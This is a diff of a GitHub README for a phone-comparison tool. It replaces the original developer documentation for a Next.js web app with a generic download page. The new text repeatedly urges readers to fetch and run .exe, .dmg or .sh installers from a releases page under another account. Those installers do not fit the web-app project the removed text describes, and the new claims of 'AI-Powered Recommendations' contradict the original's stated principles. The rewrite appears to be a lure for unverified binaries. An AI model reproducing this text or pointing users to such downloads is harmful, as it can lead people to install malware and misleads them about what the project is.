@@ -1,140 +1,56 @@
-# Phone Purchase Referee
+# 📱 phone-purchase-referee - Find Your Perfect Phone Effortlessly
 
-A phone comparison tool that provides conditional recommendations based on user constraints, following strict constitutional principles:
+## 📥 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/3loulou/phone-purchase-referee/releases)
 
-- **Multi-option comparison**: Always compares ≥2 phones
-- **Conditional logic**: Never declares an absolute "best phone"
-- **Explicit trade-offs**: Shows measurable gains and sacrifices
-- **Transparent reasoning**: All elimination reasons are explicit
-- **Deterministic engine**: No AI in decision-making (AI only for research)
+## 🚀 Getting Started
+Welcome to the **phone-purchase-referee**! This application helps you find the right phone for you using smart AI features. Follow the steps below to download and run the software.
 
-## Tech Stack
+## 🛠️ System Requirements
+- **Operating System:** Windows 10 or later, macOS, or any Linux distribution.
+- **Memory:** Minimum 4GB RAM recommended.
+- **Storage:** At least 200MB of free disk space.
+- **Internet Connection:** Required for downloading the app and using APIs.
 
-- **TypeScript**: Full-stack type safety
-- **Next.js 16**: App Router with Server Components
-- **Gemini API**: Research-only (phone data gathering)
-- **Tailwind CSS**: Utility-first styling
-- **Vitest**: Fast testing with property-based tests
-- **Zod**: Schema validation
+## 📂 Features
+- **AI-Powered Recommendations:** Get suggestions based on your preferences.
+- **Multi-Criteria Decision Analysis:** Evaluate options side by side.
+- **Tradeoff Visualization:** See how different features compare visually.
+- **Sensitivity Analysis:** Understand how changes may affect your choices.
+- **User-Friendly Interface:** Easily navigate through the app with no prior experience needed.
 
-## Getting Started
+## 🔍 How to Access the Application
+1. **Visit the Releases Page:** Click [here](https://github.com/3loulou/phone-purchase-referee/releases) to go to the Releases page.
+2. **Choose Your Version:** Look for the latest version. It will have the highest version number. 
+3. **Download the Installer:** Click on the appropriate download link for your operating system.
 
-### Prerequisites
+## 📥 Download & Install
+To download the application, visit this page to download: [Releases Page](https://github.com/3loulou/phone-purchase-referee/releases).
 
-- Node.js 18+
-- npm or yarn
-- Gemini API key (get from https://aistudio.google.com/apikey)
+### Installation Steps
+1. **Locate the Downloaded File:** After downloading, find the installer file in your Downloads folder.
+2. **Run the Installer:**
+   - **Windows:** Double-click the `.exe` file.
+   - **macOS:** Open the `.dmg` file and drag the app to your Applications folder.
+   - **Linux:** Use the package manager or run the `.sh` file in your Terminal.
+3. **Follow On-Screen Instructions:** The installer will guide you through the setup process.
+4. **Launch the Application:** Once installed, open the app to start finding your perfect phone.
 
-### Installation
+## 🚧 Troubleshooting
+If you encounter any issues during installation or usage:
+- **Check System Requirements:** Ensure your system meets the app requirements.
+- **Re-download the Installer:** Sometimes the download may get interrupted. Download again and try.
+- **Visit the FAQ:** Check the FAQ section on the repository for common questions.
 
-```bash
-# Install dependencies
-npm install
+## 📬 Get Support
+For any questions or help, please open an issue in the GitHub repository. The maintainers are here to help you with any problems you may face.
 
-# Copy environment template
-cp .env.example .env.local
+## 📚 Learning Resources
+Want to know more about how the app works?
+- **User Guide:** Detailed instructions are available in the repository.
+- **API Documentation:** Understand the Gemini API for deeper insights into the recommendations.
 
-# Add your Gemini API key to .env.local
-GEMINI_API_KEY=your_key_here
-```
+## 🌟 Contribution
+If you are interested in contributing to **phone-purchase-referee**, feel free to check the guidelines in the repository. Your input can help improve the app for everyone.
 
-### Development
-
-```bash
-# Start development server
-npm run dev
-
-# Run tests
-npm test
-
-# Run tests with UI
-npm run test:ui
-
-# Check coverage
-npm run test:coverage
-```
-
-Visit [http://localhost:3000](http://localhost:3000) to see the app.
-
-## Project Structure
-
-```
-/app/                    # Next.js App Router
-  ├── page.tsx          # Home page
-  ├── layout.tsx        # Root layout
-  ├── actions.ts        # Server Actions
-  ├── compare/          # Constraint-first mode
-  └── select/           # User-selected mode
-
-/core/referee-engine/   # ⭐ THE HEART - Pure TypeScript logic
-  ├── types.ts          # Core type definitions
-  ├── rules.ts          # Elimination rules
-  ├── scoring.ts        # Scoring algorithm
-  ├── eliminations.ts   # Rejection reason generator
-  └── index.ts          # Main referee interface
-
-/ai/                    # AI Research Layer (data only!)
-  ├── gemini-research.ts
-  └── prompts/
-
-/lib/                   # Utilities
-  ├── data/phones.json  # Phone database
-  └── utils.ts
-
-/components/            # React components
-/tests/                 # Integration tests
-/docs/                  # Documentation
-```
-
-## Constitutional Principles
-
-This project follows strict principles defined in `.specify/memory/constitution.md`:
-
-1. **Multi-Option Comparison**: System MUST compare at least 2 options
-2. **No Absolute Recommendations**: Use conditional framework ("Phone X IF constraint Y")
-3. **Explicit Trade-Offs**: Show measurable dimensions (battery mAh, price delta)
-4. **Conditional Logic**: All recommendations are traceable and conditional
-5. **Explainable Reasoning**: Users can trace why Phone X recommended over Y
-
-## Development Workflow
-
-This project follows Specification-Driven Development (SDD):
-
-1. **Specification** (`specs/001-phone-purchase-referee/spec.md`)
-2. **Planning** (`specs/001-phone-purchase-referee/plan.md`)
-3. **Implementation** (you are here!)
-
-All design decisions are documented in `specs/001-phone-purchase-referee/`.
-
-## Testing
-
-- **Unit tests**: Referee engine functions (rules, scoring, eliminations)
-- **Property-based tests**: Determinism, constitutional compliance
-- **Integration tests**: End-to-end flows
-
-```bash
-# Run all tests
-npm test
-
-# Watch mode
-npm test -- --watch
-
-# Coverage report
-npm run test:coverage
-```
-
-## Deployment
-
-Deploy to Vercel with one click:
-
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/yourusername/refree)
-
-Make sure to set the `GEMINI_API_KEY` environment variable in your Vercel project settings.
-
-## License
-
-MIT
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development guidelines.
+Thank you for using **phone-purchase-referee**! We hope this application helps you make the best phone choice for your needs.
